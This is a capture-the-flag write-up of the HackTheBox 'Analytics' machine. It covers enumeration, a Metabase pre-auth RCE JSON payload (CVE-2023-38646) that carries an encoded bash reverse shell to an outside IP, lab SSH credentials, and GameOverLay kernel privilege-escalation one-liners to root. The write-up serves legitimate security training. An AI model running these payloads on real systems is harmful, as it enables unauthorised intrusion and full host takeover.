---
title: "HackTheBox | Analytics"
layout: post
date: 2024-03-30 21:00
tag: 
- HackTheBox
- Pentesting
- Machines
- Metabase
- Easy
- Docker
- GameOverlay
image: https://labs.hackthebox.com/storage/avatars/f86fcf4c1cfcc690b43f43e100f89718.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "This is a simple and minimalist template for Jekyll for those who likes to eat noodles."
category: project
author: johndoe
externalLink: false
---

# Overview

Analytics is an easy Linux HackTheBox machine. Enumeration of the website reveals a Metabase instance, which is vulnerable to Pre-Authentication RCE, which is leveraged to gain a foothold inside a Docker container. Upon enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. The root flag is obtained by exploiting the known GameOverlay kernel vulnerability.

---

# Nmap

```bash
nmap -A -T4 10.129.30.245   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 11:19 EDT
Nmap scan report for 10.129.30.245
Host is up (0.16s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open     http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
1027/tcp  filtered IIS
2638/tcp  filtered sybase
3323/tcp  filtered active-net
5950/tcp  filtered unknown
19315/tcp filtered keyshadow
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I checked the web page on port 80 and found a login page on the subdomain `data.analytical.htb` :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010203417.png>)

ffuf also showed the subdomain :

```bash
ffuf -u http://analytical.htb -c -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt -H "Host: FUZZ.analytical.htb" -fs 154
```

![alt text](<../../../assets/images/HTBPics/Pasted image 20231008172356.png>)

Now I have a Metabase login page in front of me.
<p>Metabase is an open source tool that allows for powerful data instrumentation, visualization, and querying.</p>

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010203259.png>)

The first thing I thought about was default credentials, but that wasn't the case. So I went to look for possible existing exploits for Metabase and yes that was the case. I found that there is a Pre-Auth RCE in Metabase designated as `CVE-2023-38646`. In other words, we can execute arbitrary commands on the server without requiring any authentication.

![alt text](<../../../assets/images/HTBPics/Pasted image 20231008190828.png>)

To exploit this vulnerability we must do three things :
1. Retrieve Setup Token.
2. Change the content type to application/json.
3. Send a POST request to the */api/setup/validate* endpoint with our `setup-token` and get the reverse shell.

There are two ways to obtain the `setup-token` :
1. Automatically by using the python script : [https://github.com/securezeron/CVE-2023-38646/blob/main/CVE-2023-38646-POC.py](https://github.com/securezeron/CVE-2023-38646/blob/main/CVE-2023-38646-POC.py)
2. Manually by navigating to *http://data.analytical.htb/api/session/properties* and obtain the `setup-token`.

I will show you the two methods :

- Method 1 :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231008190756.png>)

- Method 2 :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010163141.png>)

Now we have the `setup-token`, we can exploit the vulnerability, the bellow blog contains the payload we can use to exploit it, we should just use this with our own IP and port.

[https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase)

```json
{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40MS85OTk5IDA+JjEK}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

```bash
echo "bash -i >& /dev/tcp/10.10.16.41/9999 0>&1" | base64
```

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010164734.png>)

Now we are good to go :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010164750.png>)

We got a shell as metabase user :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010164841.png>)

I noticed that I am inside a docker container, the existence of the .dockerenv file confirms that :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010165002.png>)

I said how can I escape this container, while I am looking for a way I said let's check the environment variables, and boom that contained the credentials of metalytics user :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010191050.png>)

Found credentials : *metalytics : An4lytics_ds20223#*
<p>Now I can login into ssh, and find the user flag :</p>

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010191140.png>)

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010191352.png>)

Once I was in, I tried to escalate. I checked if there are any hidden files or any files with SUID byte set, but I found nothing, And next I checked the version of the os, and I googled if it is vulnerable, and I found yes there is actually a POC on reddit under the title **Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629)**:

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010200722.png>)

[https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640)

The payload works just fine, I can use commands as root on the machine :

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

Now I should customize the payload to gain a shell as root :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010200851.png>)

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("chmod u+s /bin/bash")'
```

Voilà I am root :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010201652.png>)

I can now read the root flag :

![alt text](<../../../assets/images/HTBPics/Pasted image 20231010201743.png>)

<br/>

# MACHINE PWNED!

<br/>

That was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>